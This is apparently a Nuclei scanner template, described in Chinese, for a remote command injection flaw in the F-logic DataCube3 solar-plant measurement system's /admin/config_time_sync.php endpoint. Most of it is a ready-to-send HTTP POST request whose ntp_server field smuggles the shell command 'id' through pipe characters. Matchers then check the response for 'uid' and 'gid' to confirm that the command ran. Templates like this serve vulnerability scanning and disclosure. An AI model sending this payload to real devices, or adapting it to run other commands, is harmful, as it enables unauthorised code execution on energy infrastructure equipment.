id: flogic-datacube3-rce

info:
  name: F-logic DataCube3 config_time_sync.php 命令注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    F-logic DataCube3是一款用于光伏发电系统的紧凑型终端测量系统。该漏洞位于/admin/config_time_sync.php接口，攻击者可通过构造包含accesstime、execute、ntp_enable、ntp_server及ntp_retry_count参数的请求，利用exec函数执行任意系统命令，从而实现远程代码执行。

  tags: F-logic DataCube3

http:
- raw:
  - |
    POST /admin/config_time_sync.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Cache-Control: max-age=0
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Cookie: SESS_IDS=24ef0vbucnke26mtreijnfumve
    Upgrade-Insecure-Requests: 1

    accesstime=0.85628800 1710984011&execute=&ntp_enable=&ntp_server=127.0.0.1|id >NTest.txt|&
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'uid'
  - type: word
    part: body
    words:
    - 'gid'
